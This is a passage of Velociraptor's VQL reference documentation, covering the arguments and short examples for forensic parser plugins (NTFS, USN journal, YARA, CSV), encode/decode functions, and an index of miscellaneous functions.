mft_filename|A path to a raw $MFT file to use for path resolution.|OSPath
usn_filename|A path to a raw USN file to parse. If not provided we extract it from the Device or Image file.|OSPath
start_offset|The starting offset of the first USN record to parse.|int64
fast_paths|If set we resolve full paths using faster but less accurate algorithm.|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Parse the USN journal from a device, image file or USN file.

This plugin calculates the full path of a USN entry by tracing its
parent MFT entries through the MFT file. The MFT can be found in
the same device or image that the USN is read from, or provided
separately using a different file.

The plugin also considers information from the USN itself in
resolving the full path. This technique is described here
https://cybercx.com.au/blog/ntfs-usnjrnl-rewind/ in detail but it
can result in more accurate path resolution when the directories
have also been removed.



---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_string_with_regex/_index.md
======
---
title: parse_string_with_regex
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_string_with_regex
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string|A string to parse.|string (required)
regex|The regex to apply.|list of string (required)

### Description

Parse a string with a set of regex and extract fields. Returns a dict with fields populated from all regex capture variables.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_jsonl/_index.md
======
---
title: parse_jsonl
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_jsonl
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|JSON file to open|OSPath (required)
accessor|The accessor to use|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Parses a line oriented json file.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_ntfs/_index.md
======
---
title: parse_ntfs
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_ntfs
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
device|The device file to open. This may be a full path for example C:\Windows - we will figure out the device automatically.|string
filename|A raw image to open. You can also provide the accessor if using a raw image file.|OSPath
mft_filename|A path to a raw $MFT file to parse.|OSPath
accessor|The accessor to use.|string
inode|The MFT entry to parse in inode notation (5-144-1).|string
mft|The MFT entry to parse.|int64
mft_offset|The offset to the MFT entry to parse.|int64

### Description

Parse specific inodes from an NTFS image file or the raw device.

This function retrieves more information about a specific MFT
entry including listing all its attributes.

It can either operate on an image file or the raw device (on
windows), or alternatively you can provide a raw $MFT file.

### Example

```vql
SELECT parse_ntfs(
    filename='ntfs_image.dd',
    inode="46-128-0")
FROM scope()
```

You can get the MFT entry number from `parse_mft()` or from the
Data attribute of a `glob()` using the `ntfs` accessor.

### Example - Using a raw $MFT file

If you have previously collected the $MFT file (e.g. using the
`Windows.KapeFiles.Targets` artifact, you can use `parse_ntfs()`
to get more information about each MFT entry:

```vql
SELECT EntryNumber, OSPath,
   parse_ntfs(mft_filename=MFTFile, mft=EntryNumber) AS Details
FROM parse_mft(filename=MFTFile)
```

Note that the raw $MFT file is sometimes not sufficient to
reconstruct all attributes (for example if attributes are not
stored in the $MFT but in external clusters).



---END OF FILE---

======
FILE: /content/vql_reference/parsers/yara/_index.md
======
---
title: yara
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## yara
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
rules|Yara rules in the yara DSL or after being compiled by the yarac compiler.|string
files|The list of files to scan.|list of Any (required)
accessor|Accessor (e.g. ntfs,file)|string
context|How many bytes to include around each hit|int
start|The start offset to scan|uint64
end|End scanning at this offset (100mb)|uint64
number|Stop after this many hits (1).|int64
blocksize|Blocksize for scanning (1mb).|uint64
key|If set use this key to cache the  yara rules.|string
namespace|The Yara namespece to use.|string
vars|The Yara variables to use.|ordereddict.Dict
force_buffers|Force buffer scan in all cases.|bool

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Scan files using yara rules.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_pe/_index.md
======
---
title: parse_pe
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_pe
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file|The PE file to open.|OSPath (required)
accessor|The accessor to use.|string
base_offset|The offset in the file for the base address.|int64

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Parse a PE file.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/sqlite/_index.md
======
---
title: sqlite
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## sqlite
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file||OSPath (required)
accessor|The accessor to use.|string
query||string (required)
args||Any

### Description

Opens an SQLite file and run a query against it.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_ese_catalog/_index.md
======
---
title: parse_ese_catalog
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_ese_catalog
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file||OSPath (required)
accessor|The accessor to use.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Opens an ESE file and dump the schema.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/carve_usn/_index.md
======
---
title: carve_usn
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## carve_usn
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
device|The device file to open.|OSPath
image_filename|A raw image to open. You can also provide the accessor if using a raw image file.|OSPath
accessor|The accessor to use.|string
mft_filename|A path to a raw $MFT file to use for path resolution.|OSPath
usn_filename|A path to a raw USN file to carve. If not provided we carve the image file or the device.|OSPath

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Carve for the USN journal entries from a device.

In practice the USN journal is set to roll over fairly quickly
(default size is usually 32Mb). On busy systems this will lead to
loss of valuable information.

This plugin carves the raw device for USN entries. Usual caveats
apply for all carved data, however this will often recover entries
from a long time before the roll over.

This plugin can take a long time!

### Example

```vql
SELECT * FROM carve_usn(device='''\\.\C:''')
```



---END OF FILE---

======
FILE: /content/vql_reference/parsers/starl/_index.md
======
---
title: starl
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## starl
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
code|The body of the starlark code.|string (required)
key|If set use this key to cache the Starlark code block.|string
globals|Dictionary of values to feed into Starlark environment|Any

### Description

Compile a starlark code block - returns a module usable in VQL

Starl allows python like code to be used with VQL. This helps when
we need some small functions with more complex needs. We can use a
more powerful language to create small functions to transform
certain fields etc.

### Example

In the following example we define a Starl code block and compile
it into a module. VQL code can then reference any functions
defined within it directly.

```vql
LET MyCode <= starl(code='''
load("math.star", "math")

def Foo(X):
  return math.sin(X)

''')

SELECT MyCode.Foo(X=32)
FROM scope()
```



---END OF FILE---

======
FILE: /content/vql_reference/parsers/commandline_split/_index.md
======
---
title: commandline_split
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## commandline_split
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
command|Commandline to split into components.|string (required)
bash_style|Use bash rules (Uses Windows rules by default).|bool

### Description

Split a commandline into separate components following the windows
conventions.

### Example

```vql
SELECT
  commandline_split(command='''"C:\Program Files\Velociraptor\Velociraptor.exe" service run'''),
  commandline_split(command="/usr/bin/ls -l 'file with space.txt'", bash_style=TRUE)
FROM scope()
```



---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_csv/_index.md
======
---
title: parse_csv
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_csv
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|CSV files to open|list of OSPath (required)
accessor|The accessor to use|string
auto_headers|If unset the first row is headers|bool
separator|Comma separator (default ',')|string
comment|The single character that should be considered a comment|string
columns|The columns to use|list of string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Parses events from a CSV file.

Parses records from a CSV file. We expect the first row of the CSV
file to contain column names.  This parser specifically supports
Velociraptor's own CSV dialect and so it is perfect for post
processing already existing CSV files.

The types of each value in each column is deduced based on
Velociraptor's standard encoding scheme. Therefore types are properly
preserved when read from the CSV file.

For example, downloading the results of a hunt in the GUI will produce
a CSV file containing artifact rows collected from all clients.  We
can then use the `parse_csv()` plugin to further filter the CSV file,
or to stack using group by.

### Example

The following stacks the result from a
`Windows.Applications.Chrome.Extensions` artifact:

```vql
SELECT count(items=User) As TotalUsers, Name
FROM parse_csv(filename="All Windows.Applications.Chrome.Extensions.csv")
Order By TotalUsers
Group By Name
```



---END OF FILE---

======
FILE: /content/vql_reference/parsers/prefetch/_index.md
======
---
title: prefetch
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## prefetch
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
filename|A list of event log files to parse.|list of OSPath (required)
accessor|The accessor to use.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Parses a prefetch file.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_x509/_index.md
======
---
title: parse_x509
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_x509
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
data|X509 DER encoded string.|string (required)

### Description

Parse a DER encoded x509 string into an object.

If you have a base64 encoded certificate you will first need to strip the
header and footer and decode it, as shown in the example below.

### Example

```vql
SELECT parse_x509(
         data=base64decode(
           string=regex_transform(
             source=ca_certificate,
             map=dict(
               `-+BEGIN CERTIFICATE-+`="",
               `\n`="",
               `-+END CERTIFICATE-+`=""),
             key="A")))[0] AS ca_cert
FROM config
```



---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_xml/_index.md
======
---
title: parse_xml
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_xml
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file|XML file to open.|OSPath (required)
accessor|The accessor to use|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Parse an XML document into a dict like object.



---END OF FILE---

======
FILE: /content/vql_reference/parsers/parse_float/_index.md
======
---
title: parse_float
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## parse_float
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string|A string to convert to int|Any (required)

### Description

Convert a string to a float.


---END OF FILE---

======
FILE: /content/vql_reference/parsers/leveldb/_index.md
======
---
title: leveldb
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## leveldb
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
file|The path to the leveldb file.|OSPath
accessor|The accessor to use.|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Enumerate all items in a level db database


---END OF FILE---

======
FILE: /content/vql_reference/encode/_index.md
======
---
title: Encode/Decode
weight: 60
linktitle: Encode/Decode
index: true
no_edit: true
no_children: true
---

Encoder, decoders and cryptographic functions.
|Plugin/Function|<span class='vql_type'>Type</span>|Description|
|-|-|-|
|[base64decode](base64decode)|<span class='vql_type'>Function</span>|Decodes a base64 encoded string|
|[base64encode](base64encode)|<span class='vql_type'>Function</span>|Encodes a string into base64|
|[base85decode](base85decode)|<span class='vql_type'>Function</span>|Decode a base85 encoded string|
|[compress](compress)|<span class='vql_type'>Function</span>|Compress a file|
|[crypto_rc4](crypto_rc4)|<span class='vql_type'>Function</span>|Apply rc4 to the string and key|
|[encode](encode)|<span class='vql_type'>Function</span>|Encodes a string as as different type|
|[entropy](entropy)|<span class='vql_type'>Function</span>|Calculates shannon scale entropy of a string|
|[gunzip](gunzip)|<span class='vql_type'>Function</span>|Uncompress a gzip-compressed block of data|
|[hash](hash)|<span class='vql_type'>Function</span>|Calculate the hash of a file|
|[lzxpress_decompress](lzxpress_decompress)|<span class='vql_type'>Function</span>|Decompress an lzxpress blob|
|[pk_decrypt](pk_decrypt)|<span class='vql_type'>Function</span>|Decrypt files using pubkey encryption|
|[pk_encrypt](pk_encrypt)|<span class='vql_type'>Function</span>|Encrypt files using pubkey encryption|
|[rot13](rot13)|<span class='vql_type'>Function</span>|Apply rot13 deobfuscation to the string|
|[tlsh_hash](tlsh_hash)|<span class='vql_type'>Function</span>|Calculate the tlsh hash of a file|
|[unhex](unhex)|<span class='vql_type'>Function</span>|Apply hex decoding to the string|
|[utf16](utf16)|<span class='vql_type'>Function</span>|Parse input from utf16|
|[utf16_encode](utf16_encode)|<span class='vql_type'>Function</span>|Encode a string to utf16 bytes|
|[xor](xor)|<span class='vql_type'>Function</span>|Apply xor to the string and key|

---END OF FILE---

======
FILE: /content/vql_reference/encode/utf16_encode/_index.md
======
---
title: utf16_encode
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## utf16_encode
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string|A string to decode|string (required)

### Description

Encode a string to utf16 bytes.

### Example

```vql
utf16_encode(string="ABCD") -> "A\u0000B\u0000C\u0000D\u0000"
```



---END OF FILE---

======
FILE: /content/vql_reference/encode/base85decode/_index.md
======
---
title: base85decode
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## base85decode
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string|A string to decode|string (required)

### Description

Decode a base85 encoded string.


---END OF FILE---

======
FILE: /content/vql_reference/encode/unhex/_index.md
======
---
title: unhex
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## unhex
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string|Hex string to decode|string

### Description

Apply hex decoding to the string.

A hex encoded string consists of two hex digits per byte -
therefore valid hex encoded strings have an even length.

For example: "01230F0a"

Note: If you need to encode a string as hex encoded string you can
use the format function:

```vql
format(format="%02x", args="Hello") -> "48656c6c6f"
```



---END OF FILE---

======
FILE: /content/vql_reference/encode/gunzip/_index.md
======
---
title: gunzip
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## gunzip
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string|Data to apply Gunzip|string (required)

### Description

Uncompress a gzip-compressed block of data.

### Example

```vql
gunzip(string=base64decode(string="H4sIAAAAAAACA3N0pC4AAKAb0QxQAAAA")) -> "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```



---END OF FILE---

======
FILE: /content/vql_reference/encode/hash/_index.md
======
---
title: hash
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## hash
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
path|Path to open and hash.|OSPath (required)
accessor|The accessor to use|string
hashselect|The hash function to use (MD5,SHA1,SHA256)|list of string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Calculate the hash of a file.

This function calculates the MD5, SHA1 and SHA256 hashes of the file.



---END OF FILE---

======
FILE: /content/vql_reference/encode/utf16/_index.md
======
---
title: utf16
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## utf16
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string|A string to decode|string (required)

### Description

Parse input from utf16.

### Example

```vql
utf16(string='A\x00B\x00C\x00D\x00') -> "ABCD"
```



---END OF FILE---

======
FILE: /content/vql_reference/encode/base64encode/_index.md
======
---
title: base64encode
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## base64encode
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string|A string to decode|string (required)

### Description

Encodes a string into base64.


---END OF FILE---

======
FILE: /content/vql_reference/encode/lzxpress_decompress/_index.md
======
---
title: lzxpress_decompress
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## lzxpress_decompress
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
data|The lzxpress stream (bytes)|string (required)

### Description

Decompress an lzxpress blob.

This function is most useful when decoding prefetch files.



---END OF FILE---

======
FILE: /content/vql_reference/encode/entropy/_index.md
======
---
title: entropy
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## entropy
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string||string (required)

### Description

Calculates shannon scale entropy of a string.


---END OF FILE---

======
FILE: /content/vql_reference/encode/rot13/_index.md
======
---
title: rot13
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## rot13
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string||string

### Description

Apply rot13 deobfuscation to the string.


---END OF FILE---

======
FILE: /content/vql_reference/encode/crypto_rc4/_index.md
======
---
title: crypto_rc4
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## crypto_rc4
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string|String to apply Rc4 encryption|string (required)
key|Rc4 key (1-256bytes).|string (required)

### Description

Apply rc4 to the string and key.


---END OF FILE---

======
FILE: /content/vql_reference/encode/xor/_index.md
======
---
title: xor
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## xor
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string|String to apply Xor|string (required)
key|Xor key.|string (required)

### Description

Apply xor to the string and key.


---END OF FILE---

======
FILE: /content/vql_reference/encode/tlsh_hash/_index.md
======
---
title: tlsh_hash
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## tlsh_hash
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
path|Path to open and hash.|OSPath (required)
accessor|The accessor to use|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Calculate the tlsh hash of a file.


---END OF FILE---

======
FILE: /content/vql_reference/encode/compress/_index.md
======
---
title: compress
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## compress
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
path|A path to compress|string (required)
output|A path to write the output - default is the path with a .gz extension|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">FILESYSTEM_WRITE</span>
<span class="permission_list linkcolour label label-important">FILESYSTEM_READ</span>

### Description

Compress a file.

The file is compressed using gzip. You can change the location of
the output using the output parameter.



---END OF FILE---

======
FILE: /content/vql_reference/encode/encode/_index.md
======
---
title: encode
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## encode
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string||Any (required)
type||string (required)

### Description

Encodes a string as as different type. Currently supported types include 'hex', 'base64'.


---END OF FILE---

======
FILE: /content/vql_reference/encode/pk_decrypt/_index.md
======
---
title: pk_decrypt
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## pk_decrypt
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
data|The data to decrypt|string (required)
signing_key|Public key to verify signature|string
private_key|Private key to decrypt with. Defaults to server private key|string
scheme|Encryption scheme to use. Defaults to RSA. Currently supported: PGP,RSA|string

### Description

Decrypt files using pubkey encryption


---END OF FILE---

======
FILE: /content/vql_reference/encode/base64decode/_index.md
======
---
title: base64decode
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## base64decode
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
string|A string to decode|string (required)

### Description

Decodes a base64 encoded string.


---END OF FILE---

======
FILE: /content/vql_reference/encode/pk_encrypt/_index.md
======
---
title: pk_encrypt
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## pk_encrypt
<span class='vql_type label label-warning pull-right page-header'>Function</span>



<div class="vqlargs"></div>

Arg | Description | Type
----|-------------|-----
data|The data to encrypt|string (required)
signing_key|Private key to sign with|string
public_key|Public key to encrypt with. Defaults to server public key|string
scheme|Encryption scheme to use. Defaults to X509. Currently supported: PGP,X509|string

<span class="permission_list vql_type">Required permissions:</span><span class="permission_list linkcolour label label-important">SERVER_ADMIN</span>

### Description

Encrypt files using pubkey encryption


---END OF FILE---

======
FILE: /content/vql_reference/other/_index.md
======
---
title: Other
weight: 90
linktitle: Other
index: true
no_edit: true
no_children: true
---

Functions and plugins that do not fall into a specific category or that have
not yet been categorized.
|Plugin/Function|<span class='vql_type'>Type</span>|Description|
|-|-|-|
|[alert](alert)|<span class='vql_type'>Function</span>|Generate an alert message|
|[all](all)|<span class='vql_type'>Function</span>|Returns TRUE if all items are true|
|[any](any)|<span class='vql_type'>Function</span>|Returns TRUE if any items are true|
|[array](array)|<span class='vql_type'>Function</span>|Create an array|
|[atexit](atexit)|<span class='vql_type'>Function</span>|Install a query to run when the query is unwound|
|[batch](batch)|<span class='vql_type'>Plugin</span>|Batches query rows into multiple arrays|
|[cache](cache)|<span class='vql_type'>Function</span>|Creates a cache object|
|[cidr_contains](cidr_contains)|<span class='vql_type'>Function</span>|Calculates if an IP address falls within a range of CIDR specified|
|[collect](collect)|<span class='vql_type'>Plugin</span>|Collect artifacts into a local file|
|[combine](combine)|<span class='vql_type'>Plugin</span>|Combine the output of several queries into the same result set|
|[copy](copy)|<span class='vql_type'>Function</span>|Copy a file|
|[dedup](dedup)|<span class='vql_type'>Plugin</span>|Dedups the query based on a column|
|[delay](delay)|<span class='vql_type'>Plugin</span>|Executes 'query' and delays relaying the rows by the specified number of seconds|
|[dirname](dirname)|<span class='vql_type'>Function</span>|Return the directory path|
|[efivariables](efivariables)|<span class='vql_type'>Plugin</span>|Enumerate efi variables|
|[elastic_upload](elastic_upload)|<span class='vql_type'>Plugin</span>|Upload rows to elastic|
|[enumerate](enumerate)|<span class='vql_type'>Function</span>|Collect all the items in each group by bin|
|[environ](environ)|<span class='vql_type'>Function</span>|Get an environment variable|
|[environ](environ)|<span class='vql_type'>Plugin</span>|The row returned will have all environment variables as|
|[eval](eval)|<span class='vql_type'>Function</span>|Evaluate a vql lambda function on the current scope|
|[favorites_list](favorites_list)|<span class='vql_type'>Plugin</span>|List all user's favorites|
|[filesystems](filesystems)|<span class='vql_type'>Plugin</span>|Enumerates mounted filesystems|
|[for](for)|<span class='vql_type'>Plugin</span>|Iterate over a list|
|[gcs_pubsub_publish](gcs_pubsub_publish)|<span class='vql_type'>Function</span>|Publish a message to Google PubSub|
|[generate](generate)|<span class='vql_type'>Function</span>|Create a named generator that receives rows from the query|
|[geoip](geoip)|<span class='vql_type'>Function</span>|Lookup an IP Address using the MaxMind GeoIP database|
|[getpid](getpid)|<span class='vql_type'>Function</span>|Returns the current pid of the Velociraptor process|
|[help](help)|<span class='vql_type'>Plugin</span>|Dump information about all VQL functions and plugins|
|[host](host)|<span class='vql_type'>Function</span>|Perform a DNS resolution|
|[ip](ip)|<span class='vql_type'>Function</span>|Format an IP address|
|[lazy_dict](lazy_dict)|<span class='vql_type'>Function</span>|Construct a dict from arbitrary keyword args - does not materialize args so it is suitable for building args via `**` expansion|
|[logscale_upload](logscale_upload)|<span class='vql_type'>Plugin</span>|Upload rows to LogScale ingestion server|
|[lru](lru)|<span class='vql_type'>Function</span>|Creates an LRU object|
|[magic](magic)|<span class='vql_type'>Function</span>|Identify a file using magic rules|
|[mail](mail)|<span class='vql_type'>Function</span>|Send Email to a remote server|
|[max](max)|<span class='vql_type'>Function</span>|Finds the largest item in the aggregate|
|[min](min)|<span class='vql_type'>Function</span>|Finds the smallest item in the aggregate|
|[netcat](netcat)|<span class='vql_type'>Plugin</span>|Make a tcp connection and read data from a socket|
|[parse_pst](parse_pst)|<span class='vql_type'>Plugin</span>|Parse a PST file and extract email data|
|[patch](patch)|<span class='vql_type'>Function</span>|Patch a JSON object with a json patch or merge|
|[path_join](path_join)|<span class='vql_type'>Function</span>|Build a path by joining all components|
|[pe_dump](pe_dump)|<span class='vql_type'>Function</span>|Dump a PE file from process memory|
|[pipe](pipe)|<span class='vql_type'>Function</span>|A pipe allows plugins that use files to read data from a vql|
|[process_tracker](process_tracker)|<span class='vql_type'>Function</span>|Install a global process tracker|
|[process_tracker_all](process_tracker_all)|<span class='vql_type'>Function</span>|Get all processes stored in the tracker|
|[process_tracker_callchain](process_tracker_callchain)|<span class='vql_type'>Function</span>|Get a call chain from the global process tracker|
|[process_tracker_children](process_tracker_children)|<span class='vql_type'>Function</span>|Get all children of a process|
|[process_tracker_tree](process_tracker_tree)|<span class='vql_type'>Function</span>|Get the full process tree under the process id|
|[process_tracker_updates](process_tracker_updates)|<span class='vql_type'>Plugin</span>|Get the process tracker update events from the global process tracker|
|[pskill](pskill)|<span class='vql_type'>Function</span>|Kill the specified process|
|[rand](rand)|<span class='vql_type'>Function</span>|Selects a random number|
|[rate](rate)|<span class='vql_type'>Function</span>|Calculates the rate (derivative) between two quantities|
|[read_crypto_file](read_crypto_file)|<span class='vql_type'>Plugin</span>|Read a previously stored encrypted local storage file|
|[rekey](rekey)|<span class='vql_type'>Function</span>|Causes the client to rekey and regenerate a new client ID|
|[remap](remap)|<span class='vql_type'>Function</span>|Apply a remapping configuration to the root scope|
|[rm](rm)|<span class='vql_type'>Function</span>|Remove a file from the filesystem using the API|
|[rsyslog](rsyslog)|<span class='vql_type'>Function</span>|Send an RFC5424 compliant remote syslog message|
|[sample](sample)|<span class='vql_type'>Plugin</span>|Executes 'query' and samples every n'th row|
|[serialize](serialize)|<span class='vql_type'>Function</span>|Encode an object as a string|
|[sigma_log_sources](sigma_log_sources)|<span class='vql_type'>Function</span>|Constructs a Log sources object to be used in sigma rules|
|[similarity](similarity)|<span class='vql_type'>Function</span>|Compare two Dicts for similarity|
|[sleep](sleep)|<span class='vql_type'>Function</span>|Sleep for the specified number of seconds|
|[slice](slice)|<span class='vql_type'>Function</span>|Slice an array|
|[splunk_upload](splunk_upload)|<span class='vql_type'>Plugin</span>|Upload rows to splunk|
|[sql](sql)|<span class='vql_type'>Plugin</span>|Run queries against sqlite, mysql, and postgres databases|
|[stat](stat)|<span class='vql_type'>Plugin</span>|Get file information|
|[strip](strip)|<span class='vql_type'>Function</span>|Strip prefix and/or suffix from a string|
|[sum](sum)|<span class='vql_type'>Function</span>|Sums the items|
|[timestamp_format](timestamp_format)|<span class='vql_type'>Function</span>|Format a timestamp into a string|
|[typeof](typeof)|<span class='vql_type'>Function</span>|Print the underlying Go type of the variable|
|[upcase](upcase)|<span class='vql_type'>Function</span>|Returns an uppercase version of the string|
|[upload_azure](upload_azure)|<span class='vql_type'>Function</span>|Upload files to Azure Blob Storage Service|
|[upload_gcs](upload_gcs)|<span class='vql_type'>Function</span>|Upload files to GCS|
|[upload_s3](upload_s3)|<span class='vql_type'>Function</span>|Upload files to S3|
|[upload_sftp](upload_sftp)|<span class='vql_type'>Function</span>|Upload files to SFTP|
|[upload_smb](upload_smb)|<span class='vql_type'>Function</span>|Upload files using the SMB file share protocol|
|[upload_webdav](upload_webdav)|<span class='vql_type'>Function</span>|Upload files to a WebDAV server|
|[url](url)|<span class='vql_type'>Function</span>|Construct a URL or parse one|
|[uuid](uuid)|<span class='vql_type'>Function</span>|Generate a UUID|
|[version](version)|<span class='vql_type'>Function</span>|Gets the version of a VQL plugin or function|
|[write_crypto_file](write_crypto_file)|<span class='vql_type'>Plugin</span>|Write a query into an encrypted local storage file|
|[write_csv](write_csv)|<span class='vql_type'>Plugin</span>|Write a query into a CSV file|
|[write_jsonl](write_jsonl)|<span class='vql_type'>Plugin</span>|Write a query into a JSONL file|

---END OF FILE---

======
FILE: /content/vql_reference/other/write_csv/_index.md
======
---
title: write_csv
index: true
noTitle: true
no_edit: true
---



<div class="vql_item"></div>


## write_csv
<span class='vql_type label label-warning pull-right page-header'>Plugin</span>



<div class="vqlargs"></div>

